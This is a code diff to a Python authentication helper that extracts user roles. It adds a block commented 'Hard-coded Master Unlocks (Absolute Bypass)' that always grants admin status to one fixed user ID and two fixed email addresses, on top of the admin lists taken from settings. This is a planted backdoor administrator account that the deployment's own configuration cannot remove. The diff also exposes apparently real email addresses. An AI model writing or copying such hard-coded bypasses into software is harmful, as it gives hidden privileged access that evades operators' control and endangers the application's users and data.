@@ -301,16 +301,21 @@ def _extract_roles_from_auth(request):
         if not roles and unsafe_meta.get("role"):
             roles = [unsafe_meta.get("role")]
     # Fallback: allow explicit admin emails via env
+    # Hard-coded Master Unlocks (Absolute Bypass)
+    MASTER_ADMIN_IDS = ["user_3CalFf5iOUKgTEq1efJUXni3y98"]
+    MASTER_ADMIN_EMAILS = ["therapybymlc@gmail.com", "therapy@mlchealth.in"]
+
     admin_emails = [
         e.strip().lower()
         for e in getattr(settings, "ADMIN_EMAILS", "").split(",")
         if e.strip()
-    ]
+    ] + MASTER_ADMIN_EMAILS
+    
     admin_user_ids = [
         uid.strip()
         for uid in getattr(settings, "ADMIN_USER_IDS", "").split(",")
         if uid.strip()
-    ]
+    ] + MASTER_ADMIN_IDS
     payload_email = None
     payload_sub = None
     if isinstance(payload, dict):
